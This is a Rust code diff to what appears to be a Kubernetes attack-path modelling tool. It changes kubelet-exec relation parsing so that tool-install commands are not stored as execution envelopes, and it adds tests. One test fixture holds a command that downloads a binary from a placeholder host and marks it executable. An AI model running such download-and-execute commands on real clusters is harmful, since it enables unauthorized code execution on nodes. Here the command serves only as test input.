@@ -1025,7 +1025,11 @@ fn parse_kubelet_exec_source_relation(
     // can wrap via RelationSummary::wrap_command with ${CMD} substitution.
     let envelope = ctx
         .get("PROCEDURE_CMD")
-        .filter(|v| !v.trim().is_empty())
+        // A tool-install command is evidence that the capability is available,
+        // but it is not itself an execution envelope. Storing `curl && chmod`
+        // here would make later routed actions rerun the installer and discard
+        // the inner command. Envelope-backed channels must provide a real slot.
+        .filter(|v| v.contains("${CMD}"))
         .cloned();
 
     let tgt_raw = args[1].trim();
@@ -1400,6 +1404,8 @@ mod tests {
             .expect("expected KubeletExecSource relation");
         assert_eq!(rel.source_id().0, "ns/default/pod/attacker");
         assert_eq!(rel.target_id().0, "all(k8s.node)");
+        assert_eq!(rel.relation_name(), "kubelet-exec-capability");
+        assert!(!rel.is_exec_channel());
         assert_eq!(rel.envelope.as_deref(), Some("ran-ws -- ${CMD}"));
         assert_eq!(
             rel.output_transform,
@@ -1415,6 +1421,24 @@ mod tests {
             &ctx(),
         )
         .unwrap();
+        let rel = update.new_relations[0]
+            .as_any()
+            .downcast_ref::<KubeletExecSource>()
+            .expect("expected KubeletExecSource relation");
+        assert!(rel.envelope.is_none());
+        assert!(rel.output_transform.is_none());
+    }
+
+    #[test]
+    fn kubelet_exec_source_does_not_treat_installer_as_envelope() {
+        let mut args = ctx();
+        args.insert("TARGET_ID".into(), "ns/default/pod/attacker".into());
+        args.insert(
+            "PROCEDURE_CMD".into(),
+            "curl -o /tmp/ran-ws https://example/ran-ws && chmod +x /tmp/ran-ws".into(),
+        );
+
+        let update = parse_effect("k8s.kubelet-exec(sys, all(k8s.node))", &args).unwrap();
         let rel = update.new_relations[0]
             .as_any()
             .downcast_ref::<KubeletExecSource>()
